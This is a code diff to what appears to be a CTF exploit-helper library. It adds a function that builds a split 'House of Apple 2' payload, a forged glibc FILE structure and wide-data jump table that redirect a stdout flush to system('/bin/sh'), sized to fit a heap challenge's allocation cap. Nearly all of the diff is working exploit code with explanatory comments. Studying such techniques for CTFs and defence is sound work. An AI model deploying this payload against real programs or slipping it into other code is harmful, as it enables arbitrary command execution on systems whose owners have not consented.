@@ -208,6 +208,50 @@ def build_house_of_apple2(write_addr: int, *, wfile_jumps: int, system: int,
     return bytes(blob)
 
 
+def build_house_of_apple2_split(stdout_addr: int, wide_addr: int, *, wfile_jumps: int, system: int,
+                                command: bytes = b" /bin/sh"):
+    """House of Apple 2 as TWO small writes instead of one 0x300 blob, for a notebook whose size cap
+    cannot hold the full fake FILE. Returns (file_hdr, wide_blob):
+
+      file_hdr  (0xE0 B) -- written AT `_IO_2_1_stdout_`; the whole _IO_FILE_plus, with _wide_data
+                            and _lock pointing into a chunk the caller owns at `wide_addr`.
+      wide_blob (0xE8 B) -- written at `wide_addr`: the fake _IO_wide_data at +0 with its jump table
+                            packed at +0x18, so the three fields that matter land clear of each
+                            other -- 0x30 (_IO_buf_base == 0, to take the allocate path), 0x80 (the
+                            table's __doallocate == system) and 0xE0 (_wide_vtable). 0xA0 is left
+                            zero for _lock to point at.
+
+    build_house_of_apple2 needs 0x2A8 bytes only because those two structures sit inside the stdout
+    write; hoisting them into the caller's own chunk drops the largest single write to 0xE8, which a
+    small-cap notebook can still allocate."""
+    assert command[:1] in (b" ", b"\t") and not (command[0] & 0x80A), \
+        "command's first byte must keep _flags' NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING bits clear"
+    wide_vt = wide_addr + 0x18
+    wide = bytearray(b"\x00" * 0xE8)
+    hdr = bytearray(b"\x00" * 0xE0)
+
+    def _w(buf, off, val):
+        buf[off:off + 8] = _struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)
+
+    _w(wide, _WD_BUF_BASE, 0)                          # take the allocate path
+    _w(wide, 0x18 + _JT_DOALLOCATE, system)            # the controlled call target
+    _w(wide, _WD_VTABLE, wide_vt)
+    hdr[0:len(command)] = command                      # _flags == the command string
+    _w(hdr, _F_WRITE_BASE, 0)
+    _w(hdr, _F_WRITE_PTR, 1)                           # write_ptr > write_base -> flush calls overflow
+    _w(hdr, _F_BUF_BASE, 0)
+    _w(hdr, _F_LOCK, wide_addr + 0xA0)                 # zeroed, writable, inside our own chunk
+    _w(hdr, _F_WIDE_DATA, wide_addr)
+    _w(hdr, _F_VTABLE, wfile_jumps)
+    return bytes(hdr), bytes(wide)
+
+
+# The largest single write build_house_of_apple2 needs (its _lock sits at +0x2A0). Below this a
+# notebook's size cap cannot hold the one-piece FILE, and build_house_of_apple2_split applies.
+HOA2_BLOB_MIN = 0x2A8
+HOA2_SPLIT_MIN = 0xE8                                  # the larger of the split path's two writes
+
+
 def house_of_apple2_targets(libc_data: bytes) -> dict:
     """The libc offsets House of Apple 2 needs: the FILE to corrupt (`_IO_2_1_stdout_`), the vtable
     (`_IO_wfile_jumps`) and `system`. Relocate each by the leaked libc base. {} if any is absent."""
